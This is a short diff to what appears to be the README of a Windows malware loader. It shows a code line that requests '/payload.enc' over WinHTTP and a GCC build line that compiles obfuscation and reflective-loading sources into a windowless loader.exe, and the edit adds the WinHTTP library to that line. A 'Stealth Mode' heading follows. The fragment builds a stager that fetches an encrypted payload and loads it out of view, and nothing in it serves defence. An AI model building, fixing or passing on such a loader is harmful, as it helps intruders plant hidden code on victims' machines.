@@ -11,7 +11,7 @@ HINTERNET hRequest = pWinHttpOpenRequest(hConnect, GET, L"/payload.enc", NULL, 0
 ```
 ## Compile the Loader
 Compile the loader using GCC:
-```gcc -mwindows -O2 -fno-asynchronous-unwind-tables -fno-exceptions -static-libgcc main.c obfuscation.c reflective.c -o loader.exe```
+```gcc -mwindows -O2 -fno-asynchronous-unwind-tables -fno-exceptions -static-libgcc main.c obfuscation.c reflective.c -o loader.exe -lwinhttp```
 You'll need MSYS2 for the GCC environment.
 
 ## Stealth Mode
